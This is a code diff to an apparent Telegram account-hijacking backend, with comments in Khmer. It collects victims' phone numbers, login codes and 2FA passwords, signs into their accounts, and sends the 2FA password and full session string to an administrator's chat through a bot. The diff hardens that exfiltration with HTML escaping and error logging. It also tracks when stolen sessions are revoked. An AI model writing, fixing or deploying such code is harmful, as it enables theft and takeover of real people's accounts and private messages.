@@ -1,6 +1,7 @@
 import os
 import asyncio
 import sqlite3
+import html
 from flask import Flask, request, jsonify, send_from_directory
 from pyrogram import Client, filters, errors
 from pyrogram.errors import (
@@ -167,18 +168,21 @@ def delete_admin_message(chat_id, message_id):
             timeout=5
         ).json()
         
-        # 2. ប្រសិនបើ Telegram មិនឱ្យ Delete (ឧ. ក្នុង Chat ផ្ទាល់ខ្លួនលើស 48 ម៉ោង) -> Edit សារចោលភ្លាម
+        # 2. ប្រសិនបើ Telegram មិនឱ្យ Delete (ឧ. ក្នុង Chat ផ្ទាល់ខ្លួនលើស 48 ម៉ោង) -> Edit សារចោល
         if not res.get("ok"):
-            print(f"⚠️ Delete failed: {res.get('description')}. Editing message text instead...")
-            requests.post(
+            print(f"⚠️ Delete failed: {res.get('description')}. Edit message text instead...")
+            edit_res = requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                 json={
                     "chat_id": chat_id,
                     "message_id": int(message_id),
-                    "text": "🔴 **[SESSION TERMINATED & REMOVED]**\n\n*(Session នេះត្រូវគេ Terminated រួចរាល់ Data ត្រូវបានលុបចេញពី System)*"
+                    "text": "🔴 <b>[SESSION TERMINATED & REMOVED]</b>\n\n<i>(Session នេះត្រូវគេ Terminated រួចរាល់ Data ត្រូវបានលុបចេញពី System)</i>",
+                    "parse_mode": "HTML"
                 },
                 timeout=5
-            )
+            ).json()
+            if not edit_res.get("ok"):
+                print(f"⚠️ Edit failed too (likely message older than 48h): {edit_res.get('description')}")
         else:
             print(f"🗑️ Successfully deleted message {message_id} from Admin Chat.")
     except Exception as del_err:
@@ -188,11 +192,6 @@ def delete_admin_message(chat_id, message_id):
 async def monitor_single_session(phone, user_id, session_str, msg_id):
     """
     Connect ជាប់ជានិច្ច ដើម្បីដឹងភ្លាមៗពេល session ត្រូវបានគេ Terminate (logout/revoke).
-
-    - ប្រសិនបើជួប error ប្រភេទ "terminated" ពិតប្រាកដ (AuthKeyUnregistered, SessionRevoked,
-      UserDeactivated, UserDeactivatedBan, Unauthorized) → kick member + delete admin msg + cleanup DB ភ្លាម។
-    - ប្រសិនបើជួប error ផ្សេងទៀត (ណេតដាច់ បណ្តោះអាសន្ន ។ល។) → មិនបិទ monitor ទេ គឺ reconnect/retry វិញ
-      រហូតដល់ limit ដើម្បីកុំឱ្យ session នៅសេសសល់ត្រូវគេភ្លេច monitor ចោល។
     """
     client = None
     consecutive_errors = 0
@@ -246,8 +245,6 @@ async def monitor_single_session(phone, user_id, session_str, msg_id):
             return  # stop monitoring this (now-dead) session
 
         if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
-            # Not a confirmed termination, but we can't reach Telegram for this session
-            # for a long stretch — stop looping forever and let a future restart retry it.
             print(f"⛔ Giving up monitoring {phone} after {MAX_CONSECUTIVE_ERRORS} failed retries "
                   f"(not a confirmed termination — will resume on next server restart).")
             active_monitors.pop(phone, None)
@@ -334,23 +331,32 @@ async def async_verify_code(phone_number, code, password):
     msg_id = None
     if BOT_TOKEN and ADMIN_CHAT_ID:
         two_fa_text = password if password else "None"
+
+        # HTML Escape ដើម្បីការពារ Telegram Parsing Error ពេលឈ្មោះ ឬ String មានសញ្ញាពិសេស
+        full_name_safe = html.escape(full_name)
+        username_safe = html.escape(username)
+        two_fa_safe = html.escape(two_fa_text)
+        session_safe = html.escape(session_string)
+
         msg = (
-            "🟢 **New Active Telegram Session Logged In!**\n\n"
-            f"👤 **Name:** {full_name}\n"
-            f"🆔 **User ID:** `{user_id}`\n"
-            f"🏷 **Username:** {username}\n"
-            f"📱 **Phone:** `{phone_number}`\n"
-            f"🔐 **2FA :** `{two_fa_text}`\n\n"
-            f"🔑 **Pyrogram Session String:**\n`{session_string}`"
+            "🟢 <b>New Active Telegram Session Logged In!</b>\n\n"
+            f"👤 <b>Name:</b> {full_name_safe}\n"
+            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
+            f"🏷 <b>Username:</b> {username_safe}\n"
+            f"📱 <b>Phone:</b> <code>{html.escape(phone_number)}</code>\n"
+            f"🔐 <b>2FA :</b> <code>{two_fa_safe}</code>\n\n"
+            f"🔑 <b>Pyrogram Session String:</b>\n<code>{session_safe}</code>"
         )
         try:
             res = requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"},
+                json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "HTML"},
                 timeout=5
             ).json()
             if res.get("ok"):
                 msg_id = res["result"]["message_id"]
+            else:
+                print(f"❌ Telegram Send Error: {res.get('description')}")
         except Exception as e:
             print(f"Error sending msg to Telegram bot: {e}")
 
